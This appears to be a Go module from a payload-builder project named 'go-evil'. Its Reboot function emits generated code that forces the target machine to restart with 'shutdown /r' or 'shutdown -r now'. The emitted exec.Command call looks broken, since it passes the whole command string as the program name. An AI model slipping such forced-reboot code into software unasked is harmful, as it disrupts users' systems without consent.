package system

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
)

// Reboots the computer
func Reboot(s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Reboot"

	cmd := ""
	if data_object.Target_os == "windows" {
		cmd = "shutdown /r"
	} else {
		cmd = "shutdown -r now"
	}

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),

		fmt.Sprintf("exec.Command(\"%s\").Run()", cmd),
		"}"})

	data_object.Add_go_import("os/exec")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)

}
